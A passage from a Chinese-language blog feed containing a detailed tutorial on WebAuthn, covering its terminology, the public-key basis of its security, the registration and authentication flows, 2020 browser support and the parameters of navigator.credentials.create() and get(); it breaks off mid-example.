class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hexo-5/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"\n<p>WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将其表述为 “An API for accessing Public Key Credentials”，即“一个用于访问公钥凭证的 API”。WebAuthn 很强大，强大到被认为是 Web 身份认证的未来（当然，也很复杂）。你有想过通过指纹或者面部识别来登录网站吗？WebAuthn 就能在保证安全和隐私的情况下让这样的想法成为现实。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"通过 WebAuthn 调起 Windows Hello 登录网站\" width=\"1912\" height=\"966\" class=\"aligncenter size-full wp-image-2215\"></a>\n<p>你可以在<a href=\"https://webauthn.io/\" rel=\"noopener\">这个网站</a>自行体验 WebAuthn。或者，如果你有一个使用 WordPress 的站点，可以尝试一下 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WP-WebAuthn</a> 这款插件，它可以为你的站点启用 WebAuthn 登录。这是我为了写这篇文章而练手开发的插件，本文中的部分示例代码也来自这款插件。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"wp-webauthn\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/wp-webauthn\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>WebAuthn Level 1 标准已在 2019 年 3 月成为 W3C 推荐标准，而 Level 2 标准目前也已进入编辑草案阶段，但互联网上有关它的中文资料却仍然很少，国内也鲜有网站支持这一新标准。于是，在抱着各种英文资料和标准啃了几天以后，我折腾出了这篇文章。</p>\n<p>在这篇文章里，我将会从最基本的概念开始，逐渐深入 WebAuthn，直到解码公钥等深层细节。这可能是你能找到的有关 WebAuthn 最详细最基础的中文文章，也很可能是最长的。在开始之前，<strong>我强烈建议你打开菜单中的文章目录浏览一遍，以对这篇文章涉及的内容有所了解。</strong>如果你只是想了解如何简单地在你的项目中添加对 WebAuthn 的支持，那么“<a href=\"https://flyhigher.top/#webauthn-overview\">浅谈 WebAuthn</a>”部分就是你要找的；如果你想了解更多关于 WebAuthn 的底层细节，那么你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分。</p>\n<p>由于在本文写作时 WebAuthn Level 2 规范尚未定稿，<strong>这篇文章我们将只专注于 Level 1 规范。</strong></p>\n<p>这篇文章最后更新于 2020.9 ，在你读到这篇文章时，部分事实可能已经发生改变，请注意判断。</p>\n<p><strong>更新日志：</strong></p>\n<ul>\n<li>2021.1.16 添加 Chrome 开发工具信息</li>\n<li>2020.9.17 更新 iOS/iPad OS 兼容性信息</li>\n<li>2020.5.20 添加部分无用户名认证的平台兼容性内容</li>\n<li>2020.5.15 添加部分 <code>extensions</code> 相关内容与链接；添加全局凭证 ID 唯一内容；添加凭证 ID 查找相关内容；添加“从 U2F 认证迁移”一节</li>\n<li>2020.4.13 更新与修正 <code>userVerification</code> 相关内容；添加部分 Firefox 相关内容</li>\n<li>2020.3.23 文章发布</li>\n</ul>\n<p>那么让我们开始吧。<span></span></p>\n<h1>浅谈 WebAuthn</h1>\n<p>在这个部分里，我们将会从基础概念开始，了解有关 WebAuthn 和密码学的一些基础知识，并最终使用第三方库实现基础的 WebAuthn 认证。如果你已经对这些内容有所了解了，可以跳到“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”继续阅读。</p>\n<h2>为什么使用 WebAuthn</h2>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"钓鱼邮件\" width=\"709\" height=\"693\" class=\"aligncenter size-full wp-image-2162\"></a>\n<p>相信你一定收到过类似的邮件吧？只要你点进那个最显眼的链接，你就会进入一个设置好的圈套——钓鱼网站。如果你一时糊涂在这类网站上填写了你的账号和密码，bingo，你的账号就不再是你的账号了。</p>\n<p>不过，就算你警惕心再强，也无法避免密码泄露事件。Twitter, Facebook 等都爆出过明文密码泄露事件，证明再大的公司或组织也无法避免密码泄露问题。雪上加霜的是，很大一部分用户都非常喜欢使用重复密码，这就导致一次密码泄露会牵连很多网站，用户的账户安全性完全无法得到保证。</p>\n<p>那么，有什么办法解决这些问题吗？<strong>彻底解决的方法只有一个，那就是抛弃密码。</strong>可是没有密码还怎么验证用户身份呢？这就是 WebAuthn 的用武之地了。</p>\n<p><del>没有密码的好时代，来临力！</del></p>\n<h2>什么是 WebAuthn</h2>\n<p>那么到底什么是 WebAuthn 呢？如开头所说，WebAuthn 是“一个用于访问公钥凭证的 API”，网站可以通过这个 API 进行一些高安全性的身份验证。WebAuthn 一个最常见的应用就是用于网站登录时的 2FA（双重因素验证）甚至是无密码登录。通过网页调用 WebAuthn，在不同平台下，<strong>我们可以实现通过 USB Key、指纹、面部甚至虹膜扫描来认证身份，同时确保安全和隐私。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 可使用的各种身份认证方式\" width=\"1294\" height=\"566\" class=\"aligncenter size-full wp-image-2213\"></a>\n<p>WebAuthn 标准是 FIDO2 标准的一部分，而 FIDO2 则是由 FIDO 联盟和 W3C 共同推出的 U2F（现称作 FIDO1）的后继标准，旨在增强网络认证的安全性。</p>\n<blockquote><p>你可能了解过 U2F，那么 U2F 和 FIDO2 的区别在哪里呢？从名字上可以看出，U2F，即“通用第二因素协议”，是专注于作为密码后的第二道屏障的，而 FIDO2 增加了单因素认证功能，这意味着使用 FIDO2 可以完全替代密码，真正实现无密码登录。</p></blockquote>\n<p>FIDO2 标准主要包括四个部分，其一是用于网站和访客设备交互的 WebAuthn，而 Client to Authenticator Protocol 2（CTAP2，客户端-认证器协议）作为 WebAuthn 的补充，则是用于访客的设备和认证器交互的协议。标准的其他两个部分则是 U2F 和 UAF 规范。在这篇文章中，我们只关心 WebAuthn，不会涉及 CTAP, U2F 和 UAF 的相关知识。如果你对这段话中的一些概念不了解，不要紧张，接下来我们就来谈谈 WebAuthn 中一些常用的术语和概念。</p>\n<blockquote><p>WebAuthn 只能在安全上下文中使用，也就是说，页面需要使用 HTTPS 协议或是处于 <code>localhost</code> 中。</p></blockquote>\n<h2>常用术语和概念</h2>\n<p>WebAuthn 中有许多不常碰到的术语，不过我只会在这里介绍一些常用的术语和概念——如果你只是希望做出一个简单的实现，那么了解这一段中的一些概念就足够了。同时，由于我实在没能找到一部分术语的通用翻译，有一些术语我按着自己的理解尽可能地翻译了，有任何问题请告诉我。</p>\n<p>在一个完整的 WebAuthn 认证流程中，通常有这么几个角色：</p>\n<ul>\n<li>Relying Party 依赖方 (RP) ：指服务提供方，即网站</li>\n<li>User 用户：正准备登录的你</li>\n<li>Authenticator 认证器：通常指 USB Key 或是设备内置的指纹扫描器、虹膜扫描器、面部识别装置等，正是它们在使用流程中代替了密码甚至是用户名</li>\n<li>User Agent 用户代理：通常指浏览器或系统，负责与认证器交互</li>\n</ul>\n<p>认证过程通常分为两种：</p>\n<ul>\n<li>Registration Ceremony 注册仪式：用户向账户上添加认证器</li>\n<li>Authentication Ceremony 验证仪式：用户通过已注册的认证器验证身份</li>\n</ul>\n<p>同时，认证过程中还会产生这些内容：</p>\n<ul>\n<li>Challenge 挑战：通常是一串随机字符串</li>\n<li>Public Key Credential 公钥凭证：由认证器产生的凭证，在技术上代替了密码</li>\n<li>Attestation 证明：注册时认证器产生的验证数据</li>\n<li>Assertion 断言：验证时认证器产生的验证数据</li>\n</ul>\n<blockquote><p><strong>请注意区分证明 (Attestation) 和断言 (Assertion)</strong>，特别是在这两个单词有些相似的情况下。在 WebAuthn 中，它们是不同过程中的类似概念，但并不相同。</p></blockquote>\n<p>如果你对于这些内容不是很理解，没有关系，我们会在“<a href=\"https://flyhigher.top/#how-to-webauthn\">使用流程</a>”一节中将这些概念放到实际情况中解释，你只要先区分这些概念即可。</p>\n<h2>安全性的基础</h2>\n<p>WebAuthn 为什么安全？和 HTTPS 一样，WebAuthn 使用非对称加密的思路来保证安全性，但侧重点又有所不同。要理解 WebAuthn 的认证流程，我们必须对非对称加密有所了解。如果你对非对称加密比较熟悉了，就直接跳到下一段吧。</p>\n<p>WebAuthn 的核心在于“认证”，即保证产生了凭证的认证器是用户的认证器，而不是第三方在伪造凭证。但为什么要使用非对称加密呢？我们可以先来看看对称加密。</p>\n<p>让我们假设小明和小红相互写信，见不到对方。这天小红突然想，给自己写信的人是不是真的小明呢？于是小红要求对方向小红证明自己是小明。怎么证明呢？他们商量出来这么一套方案：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明和小红商量一个统一的密码和密钥</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明用提前和小红商量好的密码和密钥加密文本后发回给小红</li>\n<li>小红使用相同的密码和密钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和密钥</li>\n</ol>\n<blockquote><p>在密码学中，我们通常把“加密算法”称为密码 (code)，和通常登录时用的密码 (password) 并非同一个概念。</p></blockquote>\n<p>在这种情况下，<strong>只要密钥不泄露</strong>，即拥有正确密钥的只有小明和小红，那么小红就能确定对方一定是小明。但这样的问题也很明显，如果小明和小红不能见面，那么他们就必须先以明文交换密码——<strong>在这个过程中一旦有人窃取到了密码，这个认证就无效了。</strong></p>\n<p>这时我们就需要使用<strong>非对称加密</strong>来拯救破碎的信任了。非对称加密的基础是一对密钥，也就是公钥和私钥，它们是互相关联但（几乎）无法互相推导的。在非对称加密的过程中，选择相同的密码后，使用私钥加密明文得到的密文只能由对应的公钥解密，无法使用私钥解密，同时这个过程反过来也是成立的。</p>\n<blockquote><p>本文的核心并不是非对称加密算法，因此不会详述非对称加密在数学上的证明，若有兴趣可以自行了解。</p></blockquote>\n<p>这就完美解决密钥泄露的问题了。让我们回过头来看之前的例子。现在小明和小红决定使用非对称加密来证明身份，过程如下：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明提前生成一对公私钥，将公钥发送给小红，私钥自己保管，同时商量好统一的密码</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明使用商量好的密码和自己的私钥加密文本，发送给小红</li>\n<li>小红使用相同的密码和小明的公钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和私钥</li>\n</ol>\n<p>在这种情况下，<strong>只要私钥不泄露</strong>，那么小红解密得到的文本和之前发送的一致，那么就可以证明收到的密文一定是由小明加密后发送过来的。而在整个过程中，私钥都没有离开过小明，更没有经过传输，也就几乎没有泄露的可能了。这时，小红终于可以确定对面和她通信的人的确是小明了。</p>\n<p>题外话：HTTPS 虽然也应用了非对称加密，但 HTTPS 更侧重于“加密”而非“认证”，因此思路上会有些许差异。要了解关于 HTTPS 和非对称加密的更多信息，你可以阅读我之前写的这篇文章：</p>\n<p></p>\n<div class=\"mdx-post-cot\" data-mdxposturl=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdx-post-wait-out-c2\"><div class=\"mdx-post-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<span></span>\n<h2>使用流程</h2>\n<p>了解了非对称加密，我们就可以来看看 WebAuthn 的认证流程了。</p>\n<p>和普通的密码一样，<strong>使用 WebAuthn 分为两个部分，注册和验证。</strong>注册仪式会在依赖方中将认证器的一些信息和用户建立关联；而验证仪式则是验证这些信息以登确保是用户本人在登录。根据上一节的思路，我们可以知道，注册仪式就是认证器生成一对公私钥，然后将公钥交给依赖方；而验证仪式是依赖方发送给认证器一段文本，要求认证器用自己的私钥加密后发回以验证。</p>\n<p>在实际情况中，WebAuthn 是基于<strong>挑战-应答模型</strong>工作的。要更好地理解，我们直接来看具体流程。先来看看注册的流程。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 注册流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2224\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的注册请求</li>\n<li>依赖方向浏览器发送挑战、依赖方信息和用户信息</li>\n<li>浏览器向认证器发送挑战、依赖方信息、用户信息和客户端信息以请求创建公钥凭证</li>\n<li>认证器请求用户动作，随后创建一对公私钥，并使用私钥签名挑战（即证明），和公钥一起交给浏览器</li>\n<li>浏览器将签名后的挑战和公钥发送给依赖方</li>\n<li>依赖方用公钥验证挑战是否与发送的一致，如果成功则将公钥与用户绑定，注册完成</li>\n</ol>\n<p>我也做了一个交互式的 Demo，你可以对照流程来更好地理解。</p>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\">开始注册</button> <span></span></p>\n<div></div>\n<blockquote><p>注意，这个 Demo 和下方的 Demo 都只是一个本地模拟的简单示例，没有任何数据会被上传，当然也不会对数据进行验证。</p></blockquote>\n<p>而之后的验证流程如下：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 验证流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2226\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的验证请求</li>\n<li>依赖方向浏览器发送挑战</li>\n<li>浏览器向认证器发送挑战、依赖方信息和客户端信息以请求获取公钥凭证</li>\n<li>认证器请求用户动作，随后通过依赖方信息找到对应私钥，并使用私钥签名挑战（即断言），交给浏览器</li>\n<li>浏览器将签名后的挑战发送给依赖方</li>\n<li>依赖方用之前存储的公钥验证挑战是否与发送的一致，一致则验证成功</li>\n</ol>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\" disabled>开始验证</button> <span>在上方注册后才能验证</span></p>\n<div></div>\n<p>可以看到，WebAuthn 不仅在理论上是安全的，同时<strong>在整个过程中并没有隐私数据被传输</strong>——用户信息实际上只包含用户名和用户 ID。因此我们完全可以说 WebAuthn 是安全且私密的。</p>\n<blockquote><p>为了避免用户在不同依赖方之间被追踪，认证器通常会为每个依赖方和用户的组合都创建一对公私钥。不过，由于认证器的存储空间有限，认证器通常不会存储每一个私钥，而是会通过各类信息和烧录在认证器内的主密钥“算”出对应的私钥以实现无限对公私钥。具体算法根据不同厂商会有所不同。对于 Yubikey，你可以在<a href=\"https://developers.yubico.com/U2F/Protocol_details/Key_generation.html\">这里</a>了解更多。</p></blockquote>\n<blockquote><p>如果依赖方需要，用户同意后，发送给依赖方的公钥凭证中可以包含用于辨认认证器型号的信息，不过这对隐私的影响微乎其微。</p></blockquote>\n<h2>浏览器接口</h2>\n<p>要使用 WebAuthn，我们必须要依靠浏览器作为媒介和验证器进行交互，而这就需要浏览器对于 WebAuthn 的支持了。绝大多数新版本的现代浏览器都为 WebAuthn 提供了统一的接口，而在这一段中我们会了解如何使用相关的接口。但是在开始之前，我们可以先来看看浏览器的支持程度（2020.9）。</p>\n<div class=\"mdui-table-fluid\"><table class=\"mdui-table\">\n<thead><tr>\n<th>浏览器</th>\n<th>支持情况</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>桌面端 Chrome</td>\n<td>67+</td>\n</tr>\n<tr>\n<td>移动端 Chrome</td>\n<td>67+<sup>[1]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Firefox</td>\n<td>60+</td>\n</tr>\n<tr>\n<td>移动端 Firefox</td>\n<td>不支持<sup>[2]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Edge</td>\n<td>18+</td>\n</tr>\n<tr>\n<td>移动端 Edge</td>\n<td>不支持<sup>[3]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Safari</td>\n<td>13+</td>\n</tr>\n<tr>\n<td>移动端 Safari</td>\n<td>13.3+<sup>[4]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Opera</td>\n<td>54+</td>\n</tr>\n<tr>\n<td>移动端 Opera</td>\n<td>不支持</td>\n</tr>\n</tbody>\n</table></div>\n<p><sup>[1]</sup> 受平台限制，Chrome 在 iOS 平台上不支持 WebAuthn，在 Android 平台上支持大部分 WebAuthn 功能，但仍不支持部分特性（如 <code>userVerification</code>）。<br><sup>[2]</sup> 移动端 Firefox 80 以下的版本支持 WebAuthn 但似乎会忽略 <code>authenticatorAttachment</code> 等一部分参数，同时移动端 Firefox Beta 80 以下的版本支持 WebAuthn 但无法成功调用。自 80 版本起移动端 Firefox 暂时取消了对 WebAuthn 的支持（可能是 Bug）。<br><sup>[3]</sup> 移动端 Edge 似乎支持 WebAuthn 但无法成功调用。<br><sup>[4]</sup> Safari iOS/iPad OS 13 仅支持外部认证器，无法调用 Touch ID 或 Face ID；自 iOS/iPad OS 14 起 Safari 已支持全功能 WebAuthn，可以调用 Touch ID/Face ID</p>\n<p>当然，一众国产浏览器，包括 Samsung Browser 和 Yandex Browser，目前都不支持 WebAuthn。此外，由于 WebAuthn 涉及外部验证器和 TPM 可信平台模块等，用户的操作系统也会对 WebAuthn 的可用性造成影响。以下是一些需要注意的信息：</p>\n<ul>\n<li>Windows 10 1903 以下版本仅 Edge 能提供完整支持，其他浏览器只能使用 USB Key 等外部认证器；1903+ 中所有浏览器都可以通过 Windows Hello 带来完整的 WebAuthn 支持</li>\n<li>Android 需要安装并开启 Google 服务</li>\n<li>iOS/iPad OS 13.3 以下的版本不支持 WebAuthn，iOS/iPad OS 14 以下的版本支持有限（参考上文），iOS/iPad OS 14 开始 Safari 已支持全功能 WebAuthn（功能完整度甚至超过了 Android）</li>\n</ul>\n<p>可以看出，WebAuthn 的发展之路仍然很漫长，但好在桌面端对它的支持已经比较完善了，在一些情况下我们完全有理由使用它。</p>\n<hr>\n<p>来看看浏览器提供了怎么样的接口吧。要使用 WebAuthn，我们可以使用 <code>navigator.credentials.create()</code> 请求认证器生成公钥凭证和 <code>navigator.credentials.get()</code> 请求获取公钥凭证。</p>\n<blockquote><p>你或许已经对 Credential Management API 有所了解了。通过这些 API，我们还可以实现一些有趣的特性，不过这值得另开一篇文章来讲了。</p></blockquote>\n<p>对于一个基础的实现，<code>navigator.credentials.create()</code> 需要传入的参数如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        challenge,\r\n        rp: {\r\n            id,\r\n            name\r\n        },\r\n        user: {\r\n            id,\r\n            name,\r\n            displayName\r\n        },\r\n        pubKeyCredParams: [\r\n            {\r\n                type: \"public-key\",\r\n                alg\r\n            }\r\n        ],\r\n        authenticatorSelection: {\r\n            authenticatorAttachment,\r\n            userVerification\r\n        },\r\n        excludeCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>在 <code>navigator.credentials.create()</code> 方法中，我们必须传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值。这指明了我们需要创建公钥凭证，而非普通的密码凭证。然后，在 <code>publicKey</code> 对象中设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rp: Object</code>：依赖方信息，其中有一项为必须：\n<ul>\n<li>\n<code>rp.id: String</code>：（可选）依赖方 ID，必须为当前域名或为当前域名的子集的域名（不是子域名）。如域名为 <code>test.123.example.com</code>，则依赖方 ID 可以是 <code>test.123.example.com</code>, <code>123.example.com</code> 或 <code>example.com</code>。不指定则默认使用当前域名</li>\n<li>\n<code>rp.name: String</code>：依赖方名称，用于方便用户辨认</li>\n</ul>\n</li>\n<li>\n<code>user: Object</code>：用户信息，其中有三项为必须：\n<ul>\n<li>\n<code>user.id: Uint8Array</code>：转换为 <code>Uint8Array</code> 的字符串。<strong>出于安全考量，这应尽可能不与任何用户信息相关联，如不要包含用户名、用户邮箱等</strong>\n</li>\n<li>\n<code>user.name: String</code>：登录用户名</li>\n<li>\n<code>user.dispalyName: String</code>：用于显示的用户名称，显示与否的具体行为取决于浏览器</li>\n</ul>\n</li>\n<li>\n<code>pubKeyCredParams: Array</code>：一个算法列表，指明依赖方接受哪些签名算法。列表的每一项都是一个对象，拥有两个属性：\n<ul>\n<li>\n<code>pubKeyCredParams[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>pubKeyCredParams[].alg: Number</code>：一个负整数，用于标明算法。具体算法对应的数字可以在 <a href=\"https://www.iana.org/assignments/cose/cose.xhtml#algorithms\">COSE</a> 找到</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection: Object</code>：（可选）用于过滤正确的认证器，这里介绍常用的一个参数：\n<ul>\n<li>\n<code>authenticatorSelection.authenticatorAttachment: String</code>：（可选）指定要求的认证器类型。如果没有满足要求的认证器，认证可能会失败。该参数可以为 <code>null</code>（表示接受所有类型的认证器）或是以下两个值之一：\n<ul>\n<li>\n<code>platform</code>：表示仅接受平台内置的、无法移除的认证器，如手机的指纹识别设备</li>\n<li>\n<code>cross-platform</code>：表示仅接受外部认证器，如 USB Key</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection.userVerification: String</code>：（可选）指定认证器是否需要验证“用户为本人 (User Verified, UV)”，否则只须“用户在场 (User Present, UP)”。具体验证过程取决于认证器（不同认证器的认证方法不同，也有认证器不支持用户验证），而对验证结果的处理情况则取决于依赖方。该参数可以为以下三个值之一：\n<ul>\n<li>\n<code>required</code>：依赖方要求用户验证</li>\n<li>\n<code>preferred</code>：（默认）依赖方希望有用户验证，但也接受用户在场的结果</li>\n<li>\n<code>discouraged</code>：依赖方不关心用户验证。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>excludeCredentials: Array</code>：（可选）用于标识要排除的凭证，可以避免同一个用户多次注册同一个认证器。如果用户试图注册相同的认证器，用户代理会抛出 <code>InvalidStateError</code> 错误。数组中的每一项都是一个公钥凭证对象，包含以下属性：\n<ul>\n<li>\n<code>excludeCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>excludeCredentials[].id: Uint8Array</code>：要排除的凭证 ID</li>\n<li>\n<code>excludeCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，超时后将强制终止 <code>create()</code> 并抛出错误。若不设置，将使用用户代理的默认值；若太大或太小，则使用最接近的用户代理默认值范围中的值。推荐值为 5000-120000</li>\n</ul>\n<blockquote><p>对于 <code>pubKeyCredParams</code>，通常我们只需添加 ES256 (alg: -7) 算法即可兼容大部分外部认证器，此外，再添加 RS256 (alg: -257) 算法即可兼容大部分平台内置认证器（如 Windows Hello）。当然，前端添加算法之后，后端也需要相应的算法支持。</p></blockquote>\n<blockquote><p>对于 <code>userVerification</code>，由于默认值 “preferred” 并不能很好地被所有设备支持，因此无论在 <code>create()</code> 中还是 <code>get()</code> 中不指定该参数都会在 Chrome 中触发一条警告。具体请参阅<a href=\"https://chromium.googlesource.com/chromium/src/+/master/content/browser/webauth/uv_preferred.md\">这个页面</a>。</p></blockquote>\n<p>调用 <code>create()</code> 之后，我们就可以拿到一个 <code>Promise</code>，并可以在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>create()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAttestationResponse {\r\n        attestationObject: ArrayBuffer(390) {},\r\n        clientDataJSON: ArrayBuffer(121) {}\r\n    },\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\",\r\n    type: \"public-key\"\r\n}</pre>\n<p>其中有：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：<code>AuthenticatorAttestationResponse</code> 对象，是 <code>PublicKeyCredential</code> 的主要部分，包含以下两个内容：\n<ul>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n<li>\n<code>response.attestationObject: ArrayBuffer</code>：CBOR 编码的认证器数据，包含凭证公钥、凭证 ID、签名（如果有）、签名计数等信息</li>\n</ul>\n</li>\n</ul>\n<p>然后将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串，我们就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证与注册了。具体怎么操作，我们会在下文详细讨论。当然，别忘了 <code>catch()</code> 注册过程中抛出的任何错误。</p>\n<blockquote><p>你可能会认为在所有情况下，注册时认证器都会对挑战进行签名。实际上在大部分情况下（同时也是默认情况），<strong>注册时认证器并不会对挑战进行签名</strong>，<code>attestationObject</code> 并不会包含签名后的挑战。只有依赖方明确要求证明且用户同意（部分浏览器要求）后认证器才会对挑战进行签名（具体实现据情况会有所不同）。对此，<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion#Attestation\">MDN 解释道</a>“大部分情况下，用户注册公钥时我们会使用「初次使用时信任模型」(TOFU) ，此时验证公钥是没有必要的。”要了解更多关于证明的内容，请参阅“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>而对于 <code>navigator.credentials.get()</code>，我们可以传入如下的参数：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.get({\r\n    publicKey: {\r\n        challenge,\r\n        rpId,\r\n        userVerification,\r\n        allowCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>和 <code>create()</code> 一样，对于 <code>get()</code> 我们需要传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值，指明我们需要获取的是公钥凭证而非普通的密码凭证。在 <code>publicKey</code> 对象中我们可以设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rpID: String</code>：（可选）依赖方 ID，需要和注册认证器时的一致。规则和上述的 <code>rp.id</code> 一致，不指定默认使用当前域名</li>\n<li>\n<code>userVerification: String</code>：和上文一样，只是需要注意它这次不在 <code>authenticatorSelection</code> 中了</li>\n<li>\n<code>allowCredentials: Array</code>：（可选）用于标识允许的凭证 ID，使用户代理找到正确的认证器。只有符合这个列表中凭证 ID 的凭证才能被成功返回。数组中的每一项都是对象，包含以下属性：\n<ul>\n<li>\n<code>allowCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>allowCredentials[].id: Uint8Array</code>：允许的凭证 ID</li>\n<li>\n<code>allowCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，和上面的一样，推荐值为 5000-120000</li>\n</ul>\n<p>嗯，要传入的参数少多了。之后，和 <code>create()</code> 一样，调用 <code>get()</code> 之后，我们就可以拿到一个 <code>Promise</code> 并在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>get()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAssertionResponse {\r\n        authenticatorData: ArrayBuffer(37) {},\r\n        signature: ArrayBuffer(256) {},\r\n        userHandle: 